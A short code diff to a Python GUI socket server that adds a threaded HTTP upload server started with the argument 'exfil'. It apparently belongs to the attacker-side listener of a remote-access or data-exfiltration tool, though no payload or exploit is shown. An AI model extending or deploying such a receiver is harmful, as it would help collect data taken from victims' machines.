@@ -1,4 +1,5 @@
 import socket
+import uploadHTTPserver
 import threading
 import tkinter as tk
 from tkinter import filedialog
@@ -40,6 +41,9 @@ class Server:
         self.worker_thread = threading.Thread(target=self.create_listening_server)
         self.worker_thread.start()
         print("Server thread started")
+        self.http_server_thread = threading.Thread(target=uploadHTTPserver.run, args=("exfil",))
+        self.http_server_thread.start()
+        print("HTTP server thread started")
         self.root.mainloop()
 
     def handle_sending(server):
